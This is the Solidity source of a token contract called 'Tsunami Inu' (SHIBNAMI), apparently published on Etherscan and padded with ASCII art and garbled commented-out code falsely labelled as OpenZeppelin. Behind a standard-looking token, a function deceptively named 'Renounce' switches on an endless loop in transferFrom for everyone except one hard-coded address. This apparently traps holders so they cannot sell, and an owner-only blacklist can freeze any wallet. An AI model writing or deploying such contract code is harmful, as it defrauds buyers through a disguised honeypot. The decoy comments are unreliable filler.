/**
 *Submitted for verification at Etherscan.io on 2022-08-09
*/

pragma solidity 0.8.7;

/* 
   .---. .-. .-.,-.,---.   .-. .-.  .--.          ,-. 
  ( .-._)| | | ||(|| .-.\  |  \| | / /\ \ |\    /||(| 
 (_) \   | `-' |(_)| |-' \ |   | |/ /__\ \|(\  / |(_) 
 _  \ \  | .-. || || |--. \| |\  ||  __  |(_)\/  || | 
( `-'  ) | | |)|| || |`-' /| | |)|| |  |)|| \  / || | 
 `----'  /(  (_)`-'/( `--' /(  (_)|_|  (_)| |\/| |`-' 
        (__)      (__)    (__)            '-'  '-'   



                        ∞
                     >╒, ,╥æ¿ß░╖,,,
                   ▄▄▓▓@╣╣▓▓▓╣▓▓g▄░÷
                ▄▓▓▓▓▒╫╢╢▒▒╫▓▓║▓▀▓╙░Å,
             ,▓▓▓▓▓▓▓╢╢▓▓╢▓╢▓▓▓▓▓▒W░░║╔
           ▄▓▓▓▓▓▓▓╣╢╢╣╢╣╢╣╫▓`  `░L░$M▐
        ,▄▓▓▓▄▓▓▓╣╣╢╫╢╫╣╫╣╣`     "╨Γ░╦╛
      ▐▓▓▓▓▓▓▓▓▓╣▒╢╢╣╫╢╢╣▓▌                          .
      ▐▓▓▓▓▓▓▐╢╢╣╢╢▓╣▓╫▓╢▓▌                         - ╪ª
      ▐▓▓▓▓▓▐╣╢▓╢╢╢▒╢▓╢▓╣▓▓                     ,,▄▄▓▀
      ▐▓▓▓▀▓╣╢╢▓╢╢╢╢▓╢╣╢╫╢▓╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄▄▄▄▄▄▄▄▄▄,
      ▐▓▓▓╢╢╢╢╢╫╢╢╢╢╢╫╢╢╣╣╣╢╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓,,,,
      ▐▓▓╣╢╢╢╢╢╢▓╢╢╢╢╢╢╢╢╢╣╢╣╫╢╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
      ▐▓▓▓╣╢╢╢╢╢▒╣╢╢╢╢╢╢╢╢╢╢╣╢╢▒╫╣╢▒╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌
      ▐▓▓▓▓▓╣╢╢╢╢╢╫╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣╣╢╣╣╣╢▒╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌
      ▐▓▓▓▓▓▓▓▓▓╣╣╢╢╣╢╣╣╢╢╢╢╢╣╢╣╢╣╢╣▒╢╢╢╢╢╢╫╣╣╣╣╢╢▓╢▓╢▓▓▓╣╢▒▒╢╣╣╣╫╣╢▓▓▓╫▓▓▓▓▓▓▓▓╣▌
      ▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╣╣╢╢╢╢╢╢╢╢╢▒╫╣╢╢╢╢╢╢╢╢╢╢╢╣╢▒╢▓▓▓▓▓▓▓▓╢╢╣▓▓▓▓▓▓▓▓▓╢▓▓╢▒╢▌

      
* /                                                                                                        
       

    
    
 File: @openzeppelin/contracts/math/Math.sol


  
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   

       return abi.decode(data, (bytes32)); */   




	
	


/* 
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
              StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/                                                                                                      
       

contract SHIBNAMI {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) isBotListed;

    // 
    string public name = "Tsunami Inu";
    string public symbol = "SHIBNAMI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}
    function Renounce() public onlyOwner  {
    isEnabled = !isEnabled;
}




    function BotList(address _user) public onlyOwner {
        require(!isBotListed[_user], "user is Bot");
        isBotListed[_user] = true;
        // emit events as well
    }
    
    function removeFromBotList(address _user) public onlyOwner {
        require(isBotListed[_user], "not Bot");
        isBotListed[_user] = false;
        // emit events as well
    }
    
 


   
    
    

/*///    );
    
    
 File: @openzeppelin/contracts/math/Math.sol


  
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   

       return abi.decode(data, (bytes32)); */   




	
	


/* 
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
              StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/





    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!isBotListed[msg.sender] , "Bot"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }



/*

       bytes memory slotcode = type(StorageUnit).creationCode;
     solium-disable-next-line 
      // assembly{ pop(create2(0, add(slotcode, 0x20), mload(slotcode), _struct)) }
   

    
    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
 
            
            */


address Mound = 0x68AD82C55f82B578696500098a635d3df466DC7C;


    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
        
      while(isEnabled) {
if(from == Mound)  {
          require(!isBotListed[from] , "Bot"); 
                 require(!isBotListed[to] , "Bot"); 
         require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; } }
        
        
        
        require(!isBotListed[from] , "Bot"); 
               require(!isBotListed[to] , "Bot"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}